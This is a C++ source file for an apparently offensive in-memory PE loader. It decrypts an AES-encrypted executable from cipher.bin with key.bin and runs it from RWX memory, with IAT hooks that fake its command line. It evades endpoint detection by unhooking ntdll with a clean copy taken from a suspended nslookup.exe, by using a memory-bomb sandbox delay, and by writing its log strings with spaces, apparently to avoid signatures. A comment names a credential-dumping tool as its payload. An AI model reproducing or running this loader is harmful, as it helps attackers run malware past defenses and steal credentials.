#define _CRT_RAND_S
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <limits>
#include <stdlib.h>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "winhttp")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ntdll")

EXTERN_C NTSTATUS NtOpenSection(
    OUT PHANDLE             SectionHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes
);

using MyNtMapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );




typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;



/*struct DATA {

    LPVOID data;
    size_t len;

};*/

typedef struct {
    char* data;
    size_t len;
} DATA;


void PianoahAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

DATA GetDataFromFile(const wchar_t* filePath) {
    DATA data;
    data.data = NULL;
    data.len = 0;

    FILE* file = _wfopen(filePath, L"rb");
    if (!file) {
        printf("F a iled to o p e n file f o r reading.\n");
        return data;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (fileSize <= 0) {
        fclose(file);
        printf("File s i z e is  i n v a l i d.\n");
        return data;
    }

    char* buffer = (char*)malloc(fileSize);
    if (!buffer) {
        fclose(file);
        printf("M e m o r y allocation f a i l e d.\n");
        return data;
    }

    size_t bytesRead = fread(buffer, 1, fileSize, file);
    if (bytesRead != (size_t)fileSize) {
        fclose(file);
        free(buffer);
        printf("F a i l e d  t o  r e a d   f i l e.\n");
        return data;
    }

    fclose(file);

    data.data = buffer;
    data.len = fileSize;
    return data;
}


//cmdline args vars
BOOL hijackCmdline = FALSE;
char* sz_masqCmd_Ansi = NULL;
char* sz_masqCmd_ArgvAnsi[100];
wchar_t* sz_masqCmd_Widh = NULL;
wchar_t* sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;
struct MemAddrs* pMemAddrs = NULL;
DWORD dwTimeout = 0;

//PE vars
BYTE* pImageBase = NULL;
IMAGE_NT_HEADERS* ntHeader = NULL;


//-------------All of these functions are custom-defined versions of functions we hook in the PE's IAT-------------

LPWSTR hookGetCommandLineW()
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinew");
    return sz_masqCmd_Widh;
}

LPSTR hookGetCommandLineA()
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinea");
    return sz_masqCmd_Ansi;
}

char*** __cdecl hook__p___argv(void)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argv");
    return &poi_masqArgvA;
}

wchar_t*** __cdecl hook__p___wargv(void)
{

    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___wargv");
    return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argc");
    return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called __wgetmainargs");
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvW;

    return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called __getmainargs");
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvA;

    return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called onexit!\n");
    return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void))
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called atexit!\n");
    return 0;
}

int __cdecl hookexit(int status)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "Exit called!\n");
    //_cexit() causes cmd.exe to break for reasons unknown...
    ExitThread(0);
    return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "ExitProcess called!\n");
    ExitThread(0);
}
void masqueradeCmdline()
{
    //Convert cmdline to widestring
    int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc(required_size + 1, sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);

    //Create widestring array of pointers
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);

    //Manual function equivalent for CommandLineToArgvA
    int retval;
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += retval;
    }

    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);

    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buffer = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }

    hijackCmdline = TRUE;
}


//This array is created manually since CommandLineToArgvA doesn't exist, so manually freeing each item in array
void freeargvA(char** array, int Argc)
{
    //Wipe cmdline args from beacon memory
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, strlen(array[i]));
    }
    LocalFree(array);
}

//This array is returned from CommandLineToArgvW so using LocalFree as per MSDN
void freeargvW(wchar_t** array, int Argc)
{
    //Wipe cmdline args from beacon memory
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, wcslen(array[i]) * 2);
    }
    LocalFree(array);
}


char* GetNTHeaders(char* pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > kMaxOffset) return NULL;
    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((char*)pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
{
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

    char* nt_headers = GetNTHeaders((char*)pe_buffer);
    if (nt_headers == NULL) return NULL;

    IMAGE_DATA_DIRECTORY* peDir = NULL;

    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

    if (peDir->VirtualAddress == NULL) {
        return NULL;
    }
    return peDir;
}

bool RepairIAT(PVOID modulePtr)
{
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importsDir == NULL) return false;

    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;

    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;

    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);

        size_t call_via = lib_desc->FirstThunk;
        size_t thunk_addr = lib_desc->OriginalFirstThunk;
        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

        size_t offsetField = 0;
        size_t offsetThunk = 0;
        while (true)
        {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);

            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
            {
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
                fieldThunk->u1.Function = addr;
            }

            if (fieldThunk->u1.Function == NULL) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function) {

                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);
                LPSTR func_name = (LPSTR)by_name->Name;

                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);
                

                if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
                }
                else if (hijackCmdline && _stricmp(func_name, "GetCommandLineW") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
                }
                else if (hijackCmdline && _stricmp(func_name, "__wgetmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__getmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__getmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___wargv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___wargv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argc") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argc;
                }
                else if (hijackCmdline && (_stricmp(func_name, "exit") == 0 || _stricmp(func_name, "_Exit") == 0 || _stricmp(func_name, "_exit") == 0 || _stricmp(func_name, "quick_exit") == 0))
                {
                    fieldThunk->u1.Function = (size_t)hookexit;
                }
                else if (hijackCmdline && _stricmp(func_name, "ExitProcess") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookExitProcess;
                }
                else
                    fieldThunk->u1.Function = addr;

            }
            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    return true;
}

void ThaanPE(char* data, DWORD datasize)
{

    masqueradeCmdline();

    unsigned int chksum = 0;
    for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; };

    BYTE* pImageBase = NULL;
    LPVOID preferAddr = 0;
    DWORD OldProtect = 0;
    
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
    if (!ntHeader) {
        exit(0);
    }
    
    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;


    HMODULE dll = LoadLibraryA("ntdll.dll");
    ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);

    pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        if (!relocDir) {
            exit(0);
        }
        else {
            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pImageBase)
            {
                exit(0);
            }
        }
    }

    // FILL the memory block with PEdata
    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
    }

    // Fix the PE Import addr table
    RepairIAT(pImageBase);

    // AddressOfEntryPoint
    size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
    
    EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
    
}




LPVOID getDatNtdll() {

    char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };

    LPVOID pntdll = NULL;

    //Create our suspended process
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    CreateProcessA("C:\\Windows\\System32\\nslookup.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!pi.hProcess)
    {
        printf("[-] Error creating process\r\n");
        return NULL;
    }

    //Get base address of NTDLL
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA(nt);
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));


    pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
    SIZE_T dwRead;
    BOOL bSuccess = ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll, pntdll, mi.SizeOfImage, &dwRead);
    if (!bSuccess) {
        printf("Failed in reading n t d l l (%u)\n", GetLastError());
        return NULL;
    }


    TerminateProcess(pi.hProcess, 0);

    printf("\t[+] Get Fresh NTDLL ... DONE!\n");

    return pntdll;
}




BOOL Unh00kaaa(LPVOID cleanNtdll) {

    char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };

    HANDLE hNtdll = GetModuleHandleA(nt);
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((DWORD64)cleanNtdll + DOSheader->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHdr = (PIMAGE_SECTION_HEADER)((DWORD64)IMAGE_FIRST_SECTION(NTheader) + ((DWORD64)IMAGE_SIZEOF_SECTION_HEADER * i));

        char txt[] = { '.','t','e','x','t', 0 };

        if (!strcmp((char*)sectionHdr->Name, txt)) {

            // prepare ntdll.dll memory region for write permissions.
            BOOL ProtectStatus1 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!ProtectStatus1) {
                printf("F a i l e d to change the p r o t e c t i o n (%u)\n", GetLastError());
                return FALSE;
            }

            // copy .text section from the mapped ntdll to the hooked one
            memcpy((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)cleanNtdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);


            // restore original protection settings of ntdll
            BOOL ProtectStatus2 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!ProtectStatus2) {
                printf("Failed to c h a n ge the p r o t e c t i o n back (%u)\n", GetLastError());
                return FALSE;
            }
            
        }
    }

    printf("\t[+] Unhook NTDLL ... DONE!\n");
    return TRUE;

}

void membmb() {
    printf("[+] Hold for 10 seconds ...\n");
    char* memory_bmb = NULL;
    memory_bmb = (char*)calloc(1048576000, sizeof(char));
    if (memory_bmb != NULL)
    {
        for (size_t i = 0; i < 10; i++)
        {
            Sleep(1000);
        }
        free(memory_bmb);
    }
}


int main(int argc, char** argv) {

        // This is for the Red5usNanoDuMper
        
        char cipherName[] = { 'c','i','p','h','e','r','.','b','i', 'n', 0};
        char keyName[] = { 'k','e','y','.','b','i','n', 0 };
        argc = 3;
        argv[1] = cipherName;
        argv[2] = keyName;
        
        if (argc != 3) {
            printf("[+] Usage: %s <Cipher> <Key>\n", argv[0]);
            return 1;
        }

        system("cls");

        char* peeeez = argv[1];

        char* key = argv[2];

        const size_t cSize2 = strlen(peeeez) + 1;
        wchar_t* wpeeee = new wchar_t[cSize2];
        mbstowcs(wpeeee, peeeez, cSize2);

        const size_t cSize3 = strlen(key) + 1;
        wchar_t* wkey = new wchar_t[cSize3];
        mbstowcs(wkey, key, cSize3);

       
        DATA PEData = GetDataFromFile(wpeeee);
        if (!PEData.data) {
            printf("[ - ] F a i l e d i n g e t t i n g A E S Encrypted PE\n");
            return -1;
        }

        DATA keyData = GetDataFromFile(wkey);
        if (!keyData.data) {
            printf("[ - ] F a i l e d in g e t t i n g k e y\n");
            return -2;
        }

        membmb();

        PianoahAES((char*)PEData.data, PEData.len, (char*)keyData.data, keyData.len);

        //membmb();

        // Fixing command line
        sz_masqCmd_Ansi = (char*)"whatEver";

        printf("\n[+] Running PE File ! \n");
        ThaanPE((char*)PEData.data, PEData.len);
        printf("\n[ + ] Finished \n");


    return 0;
}